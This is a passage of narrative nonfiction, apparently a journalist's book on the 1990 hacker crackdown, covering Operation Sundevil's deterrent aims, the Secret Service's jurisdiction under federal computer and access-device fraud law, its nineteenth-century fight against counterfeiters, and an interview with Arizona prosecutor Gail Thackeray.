only the context is new.    In this respect, the Sundevil raids were the digital equivalent of the standard vice squad crackdown on massage parlors, porno bookstores, head shops, or floating crap games. There may be few or no arrests in a raid of this sort  no convictions, no trials, no interrogations.  In cases of this sort, police may well walk out the door with many pounds of sleazy magazines, X rated videotapes, sex toys, gambling equipment, baggies of marijuana....    Of course, if something truly horrendous is discovered by the raiders, there will be arrests and prosecutions.  Far more likely, however, there will simply be a brief but sharp disruption of the closed and secretive world of the nogoodniks. There will be  street hassle.    Heat.    Deterrence.   And, of course, the immediate loss of the seized goods.  It is very unlikely that any of this seized material will ever be returned. Whether charged or not, whether convicted or not, the perpetrators will almost surely lack the nerve ever to ask for this stuff to be given back.    Arrests and trials  putting people in jail  may involve all kinds of formal legalities  but dealing with the justice system is far from the only task of police.  Police do not simply arrest people.  They don't simply put people in jail.  That is not how the police perceive their jobs.  Police  protect and serve.   Police  keep the peace,  they  keep public order.   Like other forms of public relations, keeping public order is not an exact science.  Keeping public order is something of an art form.    If a group of tough looking teenage hoodlums was loitering on a street corner, no one would be surprised to see a street cop arrive and sternly order them to  break it up.   On the contrary, the surprise would come if one of these ne'er do  wells stepped briskly into a phone booth, called a civil rights lawyer, and instituted a civil suit in defense of his Constitutional rights of free speech and free assembly.  But something much along this line was one of the many anomolous outcomes of the Hacker Crackdown.    Sundevil also carried useful  messages  for other constituents of the electronic community.  These messages may not have been read aloud from the Phoenix podium in front of the press corps, but there was little mistaking their meaning.  There was a message of reassurance for the primary victims of coding and carding   the telcos, and the credit companies.  Sundevil was greeted with joy by the security officers of the electronic business community.  After years of high tech harassment and spiralling revenue losses, their complaints of rampant outlawry were being taken seriously by law enforcement.  No more head  scratching or dismissive shrugs  no more feeble excuses about  lack of computer trained officers  or the low priority of  victimless  white collar telecommunication crimes.    Computer crime experts have long believed that computer  related offenses are drastically under reported.  They regard this as a major open scandal of their field.  Some victims are reluctant to come forth, because they believe that police and prosecutors are not computer literate, and can and will do nothing.  Others are embarrassed by their vulnerabilities, and will take strong measures to avoid any publicity  this is especially true of banks, who fear a loss of investor confidence should an embezzlement case or wire fraud surface.  And some victims are so helplessly confused by their own high technology that they never even realize that a crime has occurred  even when they have been fleeced to the bone.    The results of this situation can be dire.  Criminals escape apprehension and punishment.  The computer crime units that do exist, can't get work.  The true scope of computer crime  its size, its real nature, the scope of its threats, and the legal remedies for it  all remain obscured.    Another problem is very little publicized, but it is a cause of genuine concern.  Where there is persistent crime, but no effective police protection, then vigilantism can result. Telcos, banks, credit companies, the major corporations who maintain extensive computer networks vulnerable to hacking  these organizations are powerful, wealthy, and politically influential. They are disinclined to be pushed around by crooks  or by most anyone else, for that matter .  They often maintain well organized private security forces, commonly run by experienced veterans of military and police units, who have left public service for the greener pastures of the private sector. For police, the corporate security manager can be a powerful ally  but if this gentleman finds no allies in the police, and the pressure is on from his board of directors, he may quietly take certain matters into his own hands.    Nor is there any lack of disposable hired help in the corporate security business.  Private security agencies  the 'security business' generally  grew explosively in the 1980s. Today there are spooky gumshoed armies of  security consultants,   rent a cops,   private eyes,   outside experts   every manner of shady operator who retails in  results  and discretion.  Or course, many of these gentlemen and ladies may be paragons of professional and moral rectitude.  But as anyone who has read a hard boiled detective novel knows, police tend to be less than fond of this sort of private sector competition.    Companies in search of computer security have even been known to hire hackers.  Police shudder at this prospect.    Police treasure good relations with the business community.  Rarely will you see a policeman so indiscreet as to allege publicly that some major employer in his state or city has succumbed to paranoia and gone off the rails.  Nevertheless, police  and computer police in particular  are aware of this possibility.  Computer crime police can and do spend up to half of their business hours just doing public relations   seminars,  dog and pony shows,  sometimes with parents' groups or computer users, but generally with their core audience  the likely victims of hacking crimes.  These, of course, are telcos, credit card companies and large computer equipped corporations.  The police strongly urge these people, as good citizens, to report offenses and press criminal charges  they pass the message that there is someone in authority who cares, understands, and, best of all, will take useful action should a computer crime occur.    But reassuring talk is cheap.  Sundevil offered action.    The final message of Sundevil was intended for internal consumption by law enforcement.  Sundevil was offered as proof that the community of American computer crime police had come of age.  Sundevil was proof that enormous things like Sundevil itself could now be accomplished.  Sundevil was proof that the Secret Service and its local law enforcement allies could act like a well oiled machine   despite the hampering use of those scrambled phones .  It was also proof that the Arizona Organized Crime and Racketeering Unit  the sparkplug of Sundevil  ranked with the best in the world in ambition, organization, and sheer conceptual daring.    And, as a final fillip, Sundevil was a message from the Secret Service to their longtime rivals in the Federal Bureau of Investigation.  By Congressional fiat, both USSS and FBI formally share jurisdiction over federal computer crimebusting activities. Neither of these groups has ever been remotely happy with this muddled situation.  It seems to suggest that Congress cannot make up its mind as to which of these groups is better qualified.  And there is scarcely a G man or a Special Agent anywhere without a very firm opinion on that topic.       For the neophyte, one of the most puzzling aspects of the crackdown on hackers is why the United States Secret Service has anything at all to do with this matter.    The Secret Service is best known for its primary public role   its agents protect the President of the United States. They also guard the President's family, the Vice President and his family, former Presidents, and Presidential candidates.  They sometimes guard foreign dignitaries who are visiting the United States, especially foreign heads of state, and have been known to accompany American officials on diplomatic missions overseas.    Special Agents of the Secret Service don't wear uniforms, but the Secret Service also has two uniformed police agencies. There's the former White House Police  now known as the Secret Service Uniformed Division, since they currently guard foreign embassies in Washington, as well as the White House itself .  And there's the uniformed Treasury Police Force.    The Secret Service has been charged by Congress with a number of little known duties.  They guard the precious metals in Treasury vaults.  They guard the most valuable historical documents of the United States   originals of the Constitution, the Declaration of Independence, Lincoln's Second Inaugural Address, an American owned copy of the Magna Carta, and so forth. Once they were assigned to guard the Mona Lisa, on her American tour in the 1960s.    The entire Secret Service is a division of the Treasury Department.  Secret Service Special Agents  there are about 1,900 of them  are bodyguards for the President et al, but they all work for the Treasury.  And the Treasury  through its divisions of the U.S. Mint and the Bureau of Engraving and Printing  prints the nation's money.    As Treasury police, the Secret Service guards the nation's currency  it is the only federal law enforcement agency with direct jurisdiction over counterfeiting and forgery.  It analyzes documents for authenticity, and its fight against fake cash is still quite lively  especially since the skilled counterfeiters of Medellin, Columbia have gotten into the act . Government checks, bonds, and other obligations, which exist in untold millions and are worth untold billions, are common targets for forgery, which the Secret Service also battles.  It even handles forgery of postage stamps.    But cash is fading in importance today as money has become electronic.  As necessity beckoned, the Secret Service moved from fighting the counterfeiting of paper currency and the forging of checks, to the protection of funds transferred by wire.    From wire fraud, it was a simple skip and jump to what is formally known as  access device fraud.   Congress granted the Secret Service the authority to investigate  access device fraud  under Title 18 of the United States Code  U.S.C. Section 1029 .    The term  access device  seems intuitively simple.  It's some kind of high tech gizmo you use to get money with.  It makes good sense to put this sort of thing in the charge of counterfeiting and wire fraud experts.    However, in Section 1029, the term  access device  is very generously defined.  An access device is   any card, plate, code, account number, or other means of account access that can be used, alone or in conjunction with another access device, to obtain money, goods, services, or any other thing of value, or that can be used to initiate a transfer of funds.      Access device  can therefore be construed to include credit cards themselves  a popular forgery item nowadays .  It also includes credit card account NUMBERS, those standards of the digital underground.  The same goes for telephone charge cards  an increasingly popular item with telcos, who are tired of being robbed of pocket change by phone booth thieves .  And also telephone access CODES, those OTHER standards of the digital underground.   Stolen telephone codes may not  obtain money,  but they certainly do obtain valuable  services,  which is specifically forbidden by Section 1029.     We can now see that Section 1029 already pits the United States Secret Service directly against the digital underground, without any mention at all of the word  computer.     Standard phreaking devices, like  blue boxes,  used to steal phone service from old fashioned mechanical switches, are unquestionably  counterfeit access devices.   Thanks to Sec.1029, it is not only illegal to USE counterfeit access devices, but it is even illegal to BUILD them.   Producing,   designing   duplicating  or  assembling  blue boxes are all federal crimes today, and if you do this, the Secret Service has been charged by Congress to come after you.    Automatic Teller Machines, which replicated all over America during the 1980s, are definitely  access devices,  too, and an attempt to tamper with their punch in codes and plastic bank cards falls directly under Sec. 1029.    Section 1029 is remarkably elastic.  Suppose you find a computer password in somebody's trash.  That password might be a  code   it's certainly a  means of account access.   Now suppose you log on to a computer and copy some software for yourself. You've certainly obtained  service   computer service  and a  thing of value   the software .  Suppose you tell a dozen friends about your swiped password, and let them use it, too. Now you're  trafficking in unauthorized access devices.   And when the Prophet, a member of the Legion of Doom, passed a stolen telephone company document to Knight Lightning at PHRACK magazine, they were both charged under Sec. 1029!    There are two limitations on Section 1029.  First, the offense must  affect interstate or foreign commerce  in order to become a matter of federal jurisdiction.  The term  affecting commerce  is not well defined  but you may take it as a given that the Secret Service can take an interest if you've done most anything that happens to cross a state line.  State and local police can be touchy about their jurisdictions, and can sometimes be mulish when the feds show up.  But when it comes to computer  crime, the local police are pathetically grateful for federal help  in fact they complain that they can't get enough of it.  If you're stealing long distance service, you're almost certainly crossing state lines, and you're definitely  affecting the interstate commerce  of the telcos.  And if you're abusing credit cards by ordering stuff out of glossy catalogs from, say, Vermont, you're in for it.    The second limitation is money.  As a rule, the feds don't pursue penny ante offenders.  Federal judges will dismiss cases that appear to waste their time.  Federal crimes must be serious  Section 1029 specifies a minimum loss of a thousand dollars.    We now come to the very next section of Title 18, which is Section 1030,  Fraud and related activity in connection with computers.   This statute gives the Secret Service direct jurisdiction over acts of computer intrusion.  On the face of it, the Secret Service would now seem to command the field.  Section 1030, however, is nowhere near so ductile as Section 1029.    The first annoyance is Section 1030 d , which reads         d  The United States Secret Service shall, IN ADDITION TO ANY OTHER AGENCY HAVING SUCH AUTHORITY, have the authority to investigate offenses under this section.  Such authority of the United States Secret Service shall be exercised in accordance with an agreement which shall be entered into by the Secretary of the Treasury AND THE ATTORNEY GENERAL.   Author's emphasis.       The Secretary of the Treasury is the titular head of the Secret Service, while the Attorney General is in charge of the FBI.  In Section  d , Congress shrugged off responsibility for the computer crime turf battle between the Service and the Bureau, and made them fight it out all by themselves.  The result was a rather dire one for the Secret Service, for the FBI ended up with exclusive jurisdiction over computer break ins having to do with national security, foreign espionage, federally insured banks, and U.S. military bases, while retaining joint jurisdiction over all the other computer intrusions. Essentially, when it comes to Section 1030, the FBI not only gets the real glamor stuff for itself, but can peer over the shoulder of the Secret Service and barge in to meddle whenever it suits them.    The second problem has to do with the dicey term  Federal interest computer.   Section 1030 a  2  makes it illegal to  access a computer without authorization  if that computer belongs to a financial institution or an issuer of credit cards  fraud cases, in other words .  Congress was quite willing to give the Secret Service jurisdiction over money transferring computers, but Congress balked at letting them investigate any and all computer intrusions.  Instead, the USSS had to settle for the money machines and the  Federal interest computers.   A  Federal interest computer  is a computer which the government itself owns, or is using.  Large networks of interstate computers, linked over state lines, are also considered to be of  Federal interest.    This notion of  Federal interest  is legally rather foggy and has never been clearly defined in the courts.  The Secret Service has never yet had its hand slapped for investigating computer break ins that were NOT of  Federal interest,  but conceivably someday this might happen.     So the Secret Service's authority over  unauthorized access  to computers covers a lot of territory, but by no means the whole ball of cyberspatial wax.  If you are, for instance, a LOCAL computer retailer, or the owner of a LOCAL bulletin board system, then a malicious LOCAL intruder can break in, crash your system, trash your files and scatter viruses, and the U.S. Secret Service cannot do a single thing about it.    At least, it can't do anything DIRECTLY.  But the Secret Service will do plenty to help the local people who can.    The FBI may have dealt itself an ace off the bottom of the deck when it comes to Section 1030  but that's not the whole story  that's not the street.  What's Congress thinks is one thing, and Congress has been known to change its mind.  The REAL turf struggle is out there in the streets where it's happening. If you're a local street cop with a computer problem, the Secret Service wants you to know where you can find the real expertise. While the Bureau crowd are off having their favorite shoes polished   wing tips   and making derisive fun of the Service's favorite shoes    pansy ass tassels    the tassel toting Secret Service has a crew of ready and able hacker trackers installed in the capital of every state in the Union.  Need advice  They'll give you advice, or at least point you in the right direction.  Need training   They can see to that, too.    If you're a local cop and you call in the FBI, the FBI  as is widely and slanderously rumored  will order you around like a coolie, take all the credit for your busts, and mop up every possible scrap of reflected glory.  The Secret Service, on the other hand, doesn't brag a lot.  They're the quiet types. VERY quiet.  Very cool.  Efficient.  High tech.  Mirrorshades, icy stares, radio ear plugs, an Uzi machine pistol tucked somewhere in that well cut jacket.  American samurai, sworn to give their lives to protect our President.   The granite agents.  Trained in martial arts, absolutely fearless.  Every single one of 'em has a top secret security clearance.  Something goes a little wrong, you're not gonna hear any whining and moaning and political buck passing out of these guys.    The facade of the granite agent is not, of course, the reality.  Secret Service agents are human beings.  And the real glory in Service work is not in battling computer crime  not yet, anyway  but in protecting the President.  The real glamour of Secret Service work is in the White House Detail.  If you're at the President's side, then the kids and the wife see you on television  you rub shoulders with the most powerful people in the world.  That's the real heart of Service work, the number one priority.  More than one computer investigation has stopped dead in the water when Service agents vanished at the President's need.    There's romance in the work of the Service.  The intimate access to circles of great power  the esprit de corps of a highly trained and disciplined elite  the high responsibility of defending the Chief Executive  the fulfillment of a patriotic duty.  And as police work goes, the pay's not bad.  But there's squalor in Service work, too.  You may get spat upon by protesters howling abuse  and if they get violent, if they get too close, sometimes you have to knock one of them down   discreetly.    The real squalor in Service work is drudgery such as  the quarterlies,  traipsing out four times a year, year in, year out, to interview the various pathetic wretches, many of them in prisons and asylums, who have seen fit to threaten the President's life.  And then there's the grinding stress of searching all those faces in the endless bustling crowds, looking for hatred, looking for psychosis, looking for the tight, nervous face of an Arthur Bremer, a Squeaky Fromme, a Lee Harvey Oswald.  It's watching all those grasping, waving hands for sudden movements, while your ears strain at your radio headphone for the long rehearsed cry of  Gun!     It's poring, in grinding detail, over the biographies of every rotten loser who ever shot at a President.  It's the unsung work of the Protective Research Section, who study scrawled, anonymous death threats with all the meticulous tools of anti  forgery techniques.    And it's maintaining the hefty computerized files on anyone who ever threatened the President's life.  Civil libertarians have become increasingly concerned at the Government's use of computer files to track American citizens   but the Secret Service file of potential Presidential assassins, which has upward of twenty thousand names, rarely causes a peep of protest.  If you EVER state that you intend to kill the President, the Secret Service will want to know and record who you are, where you are, what you are, and what you're up to.  If you're a serious threat  if you're officially considered  of protective interest   then the Secret Service may well keep tabs on you for the rest of your natural life.    Protecting the President has first call on all the Service's resources.  But there's a lot more to the Service's traditions and history than standing guard outside the Oval Office.    The Secret Service is the nation's oldest general federal law enforcement agency.  Compared to the Secret Service, the FBI are new hires and the CIA are temps.  The Secret Service was founded 'way back in 1865, at the suggestion of Hugh McCulloch, Abraham Lincoln's Secretary of the Treasury.  McCulloch wanted a specialized Treasury police to combat counterfeiting.  Abraham Lincoln agreed that this seemed a good idea, and, with a terrible irony, Abraham Lincoln was shot that very night by John Wilkes Booth.    The Secret Service originally had nothing to do with protecting Presidents.  They didn't take this on as a regular assignment until after the Garfield assassination in 1881.  And they didn't get any Congressional money for it until President McKinley was shot in 1901.  The Service was originally designed for one purpose  destroying counterfeiters.       There are interesting parallels between the Service's nineteenth century entry into counterfeiting, and America's twentieth century entry into computer crime.    In 1865, America's paper currency was a terrible muddle. Security was drastically bad.  Currency was printed on the spot by local banks in literally hundreds of different designs.  No one really knew what the heck a dollar bill was supposed to look like.  Bogus bills passed easily.  If some joker told you that a one dollar bill from the Railroad Bank of Lowell, Massachusetts had a woman leaning on a shield, with a locomotive, a cornucopia, a compass, various agricultural implements, a railroad bridge, and some factories, then you pretty much had to take his word for it.   And in fact he was telling the truth!     SIXTEEN HUNDRED local American banks designed and printed their own paper currency, and there were no general standards for security.  Like a badly guarded node in a computer network, badly designed bills were easy to fake, and posed a security hazard for the entire monetary system.    No one knew the exact extent of the threat to the currency.  There were panicked estimates that as much as a third of the entire national currency was faked.  Counterfeiters  known as  boodlers  in the underground slang of the time  were mostly technically skilled printers who had gone to the bad.  Many had once worked printing legitimate currency. Boodlers operated in rings and gangs.  Technical experts engraved the bogus plates   commonly in basements in New York City.  Smooth confidence men passed large wads of high quality, high denomination fakes, including the really sophisticated stuff  government bonds, stock certificates, and railway shares.  Cheaper, botched fakes were sold or sharewared to low level gangs of boodler wannabes.   The really cheesy lowlife boodlers merely upgraded real bills by altering face values, changing ones to fives, tens to hundreds, and so on.     The techniques of boodling were little known and regarded with a certain awe by the mid nineteenth century public.  The ability to manipulate the system for rip off seemed diabolically clever.  As the skill and daring of the boodlers increased, the situation became intolerable.  The federal government stepped in, and began offering its own federal currency, which was printed in fancy green ink, but only on the back  the original  greenbacks.  And at first, the improved security of the well designed, well  printed federal greenbacks seemed to solve the problem  but then the counterfeiters caught on.  Within a few years things were worse than ever   a CENTRALIZED system where ALL security was bad!    The local police were helpless.  The Government tried offering blood money to potential informants, but this met with little success.  Banks, plagued by boodling, gave up hope of police help and hired private security men instead.  Merchants and bankers queued up by the thousands to buy privately printed manuals on currency security, slim little books like Laban Heath's INFALLIBLE GOVERNMENT COUNTERFEIT DETECTOR.  The back of the book offered Laban Heath's patent microscope for five bucks.    Then the Secret Service entered the picture.  The first agents were a rough and ready crew.  Their chief was one William P. Wood, a former guerilla in the Mexican War who'd won a reputation busting contractor fraudsters for the War Department during the Civil War.  Wood, who was also Keeper of the Capital Prison, had a sideline as a counterfeiting expert, bagging boodlers for the federal bounty money.    Wood was named Chief of the new Secret Service in July 1865.  There were only ten Secret Service agents in all   Wood himself, a handful who'd worked for him in the War Department, and a few former private investigators  counterfeiting experts   whom Wood had won over to public service.   The Secret Service of 1865 was much the size of the Chicago Computer Fraud Task Force or the Arizona Racketeering Unit of 1990.   These ten  Operatives  had an additional twenty or so  Assistant Operatives  and  Informants.   Besides salary and per diem, each Secret Service employee received a whopping twenty five dollars for each boodler he captured.    Wood himself publicly estimated that at least HALF of America's currency was counterfeit, a perhaps pardonable perception.  Within a year the Secret Service had arrested over 200 counterfeiters.  They busted about two hundred boodlers a year for four years straight.    Wood attributed his success to travelling fast and light, hitting the bad guys hard, and avoiding bureaucratic baggage.  Because my raids were made without military escort and I did not ask the assistance of state officers, I surprised the professional counterfeiter.     Wood's social message to the once impudent boodlers bore an eerie ring of Sundevil    It was also my purpose to convince such characters that it would no longer be healthy for them to ply their vocation without being handled roughly, a fact they soon discovered.     William P. Wood, the Secret Service's guerilla pioneer, did not end well.  He succumbed to the lure of aiming for the really big score.  The notorious Brockway Gang of New York City, headed by William E. Brockway, the  King of the Counterfeiters,  had forged a number of government bonds.  They'd passed these brilliant fakes on the prestigious Wall Street investment firm of Jay Cooke and Company.  The Cooke firm were frantic and offered a huge reward for the forgers' plates.    Laboring diligently, Wood confiscated the plates  though not Mr. Brockway  and claimed the reward.  But the Cooke company treacherously reneged.  Wood got involved in a down and dirty lawsuit with the Cooke capitalists.  Wood's boss, Secretary of the Treasury McCulloch, felt that Wood's demands for money and glory were unseemly, and even when the reward money finally came through, McCulloch refused to pay Wood anything.  Wood found himself mired in a seemingly endless round of federal suits and Congressional lobbying.    Wood never got his money.  And he lost his job to boot. He resigned in 1869.    Wood's agents suffered, too.  On May 12, 1869, the second Chief of the Secret Service took over, and almost immediately fired most of Wood's pioneer Secret Service agents   Operatives, Assistants and Informants alike.  The practice of receiving  25 per crook was abolished.  And the Secret Service began the long, uncertain process of thorough professionalization.    Wood ended badly.  He must have felt stabbed in the back. In fact his entire organization was mangled.    On the other hand, William P. Wood WAS the first head of the Secret Service.  William Wood was the pioneer.  People still honor his name.  Who remembers the name of the SECOND head of the Secret Service     As for William Brockway  also known as  Colonel Spencer  , he was finally arrested by the Secret Service in 1880. He did five years in prison, got out, and was still boodling at the age of seventy four.      Anyone with an interest in Operation Sundevil  or in American computer crime generally  could scarcely miss the presence of Gail Thackeray, Assistant Attorney General of the State of Arizona.  Computer crime training manuals often cited Thackeray's group and her work  she was the highest ranking state official to specialize in computer related offenses.  Her name had been on the Sundevil press release  though modestly ranked well after the local federal prosecuting attorney and the head of the Phoenix Secret Service office .    As public commentary, and controversy, began to mount about the Hacker Crackdown, this Arizonan state official began to take a higher and higher public profile.  Though uttering almost nothing specific about the Sundevil operation itself, she coined some of the most striking soundbites of the growing propaganda war    Agents are operating in good faith, and I don't think you can say that for the hacker community,  was one.  Another was the memorable  I am not a mad dog prosecutor   HOUSTON CHRONICLE, Sept 2, 1990.   In the meantime, the Secret Service maintained its usual extreme discretion  the Chicago Unit, smarting from the backlash of the Steve Jackson scandal, had gone completely to earth.    As I collated my growing pile of newspaper clippings, Gail Thackeray ranked as a comparative fount of public knowledge on police operations.    I decided that I had to get to know Gail Thackeray.  I wrote to her at the Arizona Attorney General's Office.  Not only did she kindly reply to me, but, to my astonishment, she knew very well what  cyberpunk  science fiction was.    Shortly after this, Gail Thackeray lost her job.  And I temporarily misplaced my own career as a science fiction writer, to become a full time computer crime journalist.  In early March, 1991, I flew to Phoenix, Arizona, to interview Gail Thackeray for my book on the hacker crackdown.        Credit cards didn't used to cost anything to get,  says Gail Thackeray.   Now they cost forty bucks  and that's all just to cover the costs from RIP OFF ARTISTS.       Electronic nuisance criminals are parasites.  One by one they're not much harm, no big deal.  But they never come just one by one. They come in swarms, heaps, legions, sometimes whole subcultures.  And they bite.  Every time we buy a credit card today, we lose a little financial vitality to a particular species of bloodsucker.    What, in her expert opinion, are the worst forms of electronic crime, I ask, consulting my notes.  Is it  credit card fraud   Breaking into ATM bank machines   Phone phreaking  Computer intrusions   Software viruses   Access code theft  Records tampering   Software piracy   Pornographic bulletin boards  Satellite TV piracy   Theft of cable service   It's a long list.  By the time I reach the end of it I feel rather depressed.     Oh no,  says Gail Thackeray, leaning forward over the table, her whole body gone stiff with energetic indignation,  the biggest damage is telephone fraud.  Fake sweepstakes, fake charities.  Boiler room con operations.  You could pay off the national debt with what these guys steal....  They target old people, they get hold of credit ratings and demographics, they rip off the old and the weak.   The words come tumbling out of her.    It's low tech stuff, your everyday boiler room fraud. Grifters, conning people out of money over the phone, have been around for decades.  This is where the word  phony  came from!    It's just that it's so much EASIER now, horribly facilitated by advances in technology and the byzantine structure of the modern phone system.  The same professional fraudsters do it over and over, Thackeray tells me, they hide behind dense onion shells of fake companies.... fake holding corporations nine or ten layers deep, registered all over the map.  They get a phone installed under a false name in an empty safe house.  And then they call forward everything out of that phone to yet another phone, a phone that may even be in another STATE.  And they don't even pay the charges on their phones  after a month or so, they just split  set up somewhere else in another Podunkville with the same seedy crew of veteran phone crooks. They buy or steal commercial credit card reports, slap them on the PC, have a program pick out people over sixty five who pay a lot to charities.  A whole subculture living off this, merciless folks on the con.     The 'light bulbs for the blind' people,  Thackeray muses, with a special loathing.   There's just no end to them.     We're sitting in a downtown diner in Phoenix, Arizona. It's a tough town, Phoenix.  A state capital seeing some hard times.  Even to a Texan like myself, Arizona state politics seem rather baroque.  There was, and remains, endless trouble over the Martin Luther King holiday, the sort of stiff necked, foot  shooting incident for which Arizona politics seem famous.  There was Evan Mecham, the eccentric Republican millionaire governor who was impeached, after reducing state government to a ludicrous shambles.  Then there was the national Keating scandal, involving Arizona savings and loans, in which both of Arizona's U.S. senators, DeConcini and McCain, played sadly prominent roles.    And the very latest is the bizarre AzScam case, in which state legislators were videotaped, eagerly taking cash from an informant of the Phoenix city police department, who was posing as a Vegas mobster.     Oh,  says Thackeray cheerfully.   These people are amateurs here, they thought they were finally getting to play with the big boys.  They don't have the least idea how to take a bribe!  It's not institutional corruption.  It's not like back in Philly.     Gail Thackeray was a former prosecutor in Philadelphia. Now she's a former assistant attorney general of the State of Arizona.  Since moving to Arizona in 1986, she had worked under the aegis of Steve Twist, her boss in the Attorney General's office.  Steve Twist wrote Arizona's pioneering computer crime laws and naturally took an interest in seeing them enforced. It was a snug niche, and Thackeray's Organized Crime and Racketeering Unit won a national reputation for ambition and technical knowledgeability....  Until the latest election in Arizona.  Thackeray's boss ran for the top job, and lost.  The victor, the new Attorney General, apparently went to some pains to eliminate the bureaucratic traces of his rival, including his pet group  Thackeray's group.  Twelve people got their walking papers.    Now Thackeray's painstakingly assembled computer lab sits gathering dust somewhere in the glass and concrete Attorney General's HQ on 1275 Washington Street.  Her computer crime books, her painstakingly garnered back issues of phreak and hacker zines, all bought at her own expense  are piled in boxes somewhere.  The State of Arizona is simply not particularly interested in electronic racketeering at the moment.    At the moment of our interview, Gail Thackeray, officially unemployed, is working out of the county sheriff's office, living on her savings, and prosecuting several cases   working 60 hour weeks, just as always  for no pay at all.   I'm trying to train people,  she mutters.    Half her life seems to be spent training people  merely pointing out, to the naive and incredulous  such as myself  that this stuff is ACTUALLY GOING ON OUT THERE.  It's a small world, computer crime.  A young world.  Gail Thackeray, a trim blonde Baby Boomer who favors Grand Canyon white water rafting to kill some slow time, is one of the world's most senior, most veteran  hacker trackers.   Her mentor was Donn Parker, the California think tank theorist who got it all started 'way back in the mid  70s, the  grandfather of the field,   the great bald eagle of computer crime.     And what she has learned, Gail Thackeray teaches. Endlessly. Tirelessly.  To anybody.  To Secret Service agents and state police, at the Glynco, Georgia federal training center.  To local police, on  roadshows  with her slide projector and notebook.  To corporate security personnel.  To journalists.  To parents.     Even CROOKS look to Gail Thackeray for advice.  Phone  phreaks call her at the office.  They know very well who she is. They pump her for information on what the cops are up to, how much they know.  Sometimes whole CROWDS of phone phreaks, hanging out on illegal conference calls, will call Gail Thackeray up. They taunt her.  And, as always, they boast.  Phone phreaks, real stone phone phreaks, simply CANNOT SHUT UP.  They natter on for hours.    Left to themselves, they mostly talk about the intricacies of ripping off phones  it's about as interesting as listening to hot rodders talk about suspension and distributor  caps.  They also gossip cruelly about each other.  And when talking to Gail Thackeray, they incriminate themselves.   I have tapes,  Thackeray says coolly.    Phone phreaks just talk like crazy.   Dial Tone  out in Alabama has been known to spend half an hour simply reading stolen phone codes aloud into voice mail answering machines. Hundreds, thousands of numbers, recited in a monotone, without a break  an eerie phenomenon.  When arrested, it's a rare phone phreak who doesn't inform at endless length on everybody he knows.    Hackers are no better.  What other group of criminals, she asks rhetorically, publishes newsletters and holds conventions   She seems deeply nettled by the sheer brazenness of this behavior, though to an outsider, this activity might make one wonder whether hackers should be considered  criminals  at all.  Skateboarders have magazines, and they trespass a lot.  Hot rod people have magazines and they break speed limits and sometimes kill people....    I ask her whether it would be any loss to society if phone phreaking and computer hacking, as hobbies, simply dried up and blew away, so that nobody ever did it again.    She seems surprised.   No,  she says swiftly.   Maybe a little... in the old days... the MIT stuff...  But there's a lot of wonderful, legal stuff you can do with computers now, you don't have to break into somebody else's just to learn.  You don't have that excuse. You can learn all you like.     Did you ever hack into a system  I ask.    The trainees do it at Glynco.  Just to demonstrate system vulnerabilities.  She's cool to the notion.  Genuinely indifferent.     What kind of computer do you have       A Compaq 286LE,  she mutters.     What kind do you WISH you had      At this question, the unmistakable light of true hackerdom flares in Gail Thackeray's eyes.  She becomes tense, animated, the words pour out    An Amiga 2000 with an IBM card and Mac emulation!  The most common hacker machines are Amigas and Commodores.  And Apples.   If she had the Amiga, she enthuses, she could run a whole galaxy of seized computer  evidence disks on one convenient multifunctional machine.  A cheap one, too.  Not like the old Attorney General lab, where they had an ancient CP M machine, assorted Amiga flavors and Apple flavors, a couple IBMS, all the utility software... but no Commodores.  The workstations down at the Attorney General's are Wang dedicated word processors.  Lame machines tied in to an office net  though at least they get on line to the Lexis and Westlaw legal data services.    I don't say anything.  I recognize the syndrome, though. This computer fever has been running through segments of our society for years now.  It's a strange kind of lust  K hunger, Meg hunger  but it's a shared disease  it can kill parties dead, as conversation spirals into the deepest and most deviant recesses of software releases and expensive peripherals....  The mark of the hacker beast.  I have it too.  The whole  electronic community,  whatever the hell that is, has it.  Gail Thackeray has it.  Gail Thackeray is a hacker cop.  My immediate reaction is a strong rush of indignant pity   WHY DOESN'T SOMEBODY BUY THIS WOMEN HER AMIGA !  It's not like she's asking for a Cray X  MP supercomputer mainframe  an Amiga's a sweet little cookie box thing.  We're losing zillions in organized fraud  prosecuting and defending a single hacker case in court can cost a hundred grand easy.  How come nobody can come up with four lousy grand so this woman can do her job   For a hundred grand we could buy every computer cop in America an Amiga.  There aren't that many of 'em.    Computers.  The lust, the hunger, for computers.  The loyalty they inspire, the intense sense of possessiveness.  The culture they have bred.  I myself am sitting in downtown Phoenix, Arizona because it suddenly occurred to me that the police might   just MIGHT  come and take away my computer.  The prospect of this, the mere IMPLIED THREAT, was unbearable.  It literally changed my life.  It was changing the lives of many others. Eventually it would change everybody's life.    Gail Thackeray was one of the top computer crime people in America.  And I was just some novelist, and yet I had a better computer than hers.  PRACTICALLY EVERYBODY I KNEW had a better computer than Gail Thackeray and her feeble laptop 286.  It was like sending the sheriff in to clean up Dodge City and arming her with a slingshot cut from an old rubber tire.    But then again, you don't need a howitzer to enforce the law.  You can do a lot just with a badge.  With a badge alone, you can basically wreak havoc, take a terrible vengeance on wrongdoers.  Ninety percent of  computer crime investigation  is just  crime investigation   names, places, dossiers, modus operandi, search warrants, victims, complainants, informants...    What will computer crime look like in ten years   Will it get better   Did  Sundevil  send 'em reeling back in confusion     It'll be like it is now, only worse, she tells me with perfect conviction.  Still there in the background, ticking along, changing with the times  the criminal underworld.  It'll be like drugs are.  Like our problems with alcohol.  All the cops and laws in the world never solved our problems with alcohol.  If there's something people want, a certain percentage of them are just going to take it.  Fifteen percent of the populace will never steal.  Fifteen percent will steal most anything not nailed down.  The battle is for the hearts and minds of the remaining seventy percent.    And criminals catch on fast.  If there's not  too steep a learning curve   if it doesn't require a baffling amount of expertise and practice  then criminals are often some of the first through the gate of a new technology.  Especially if it helps them to hide.  They have tons of cash, criminals.  The new communications tech  like pagers, cellular phones, faxes, Federal Express  were pioneered by rich corporate people, and by criminals.  In the early years of pagers and beepers, dope dealers were so enthralled this technology that owing a beeper was practically prima facie evidence of cocaine dealing.  CB radio exploded when the speed limit hit 55 and breaking the highway law became a national pastime.  Dope dealers send cash by Federal Express, despite, or perhaps BECAUSE OF, the warnings in FedEx offices that tell you never to try this.  Fed Ex uses X  rays and dogs on their mail, to stop drug shipments.  That doesn't work very well.    Drug dealers went wild over cellular phones.  There are simple methods of faking ID on cellular phones, making the location of the call mobile, free of charge, and effectively untraceable.  Now victimized cellular companies routinely bring in vast toll lists of calls to Colombia and Pakistan.    Judge Greene's fragmentation of the phone company is driving law enforcement nuts.  Four thousand telecommunications companies.  Fraud skyrocketing.  Every temptation in the world available with a phone and a credit card number.  Criminals untraceable.  A galaxy of  new 